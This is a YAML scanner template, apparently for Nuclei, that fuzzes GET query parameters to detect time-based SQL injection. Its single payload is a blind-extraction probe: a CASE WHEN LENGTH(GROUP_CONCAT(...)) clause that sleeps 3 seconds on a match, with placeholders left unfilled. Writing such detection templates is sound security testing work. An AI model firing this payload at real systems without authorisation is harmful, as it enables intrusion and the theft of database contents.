id: fuzz-sqli-delay

info:
  name: SQL Injection Time-Based Detection
  author: netbaan
  severity: high
  description: |
    This template detects time-based SQL injection vulnerabilities using a specified payload to induce a delay in response.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Only run on GET requests
    
    payloads:
      sqli:
        - "SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}' and table_name = '{where2}'))={i} THEN sleep(3) ELSE sleep(0) END"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200  # Check if the status code is OK

      - type: time
        time:
          - 3000  # Time-based matching, expecting a response delay of about 3 seconds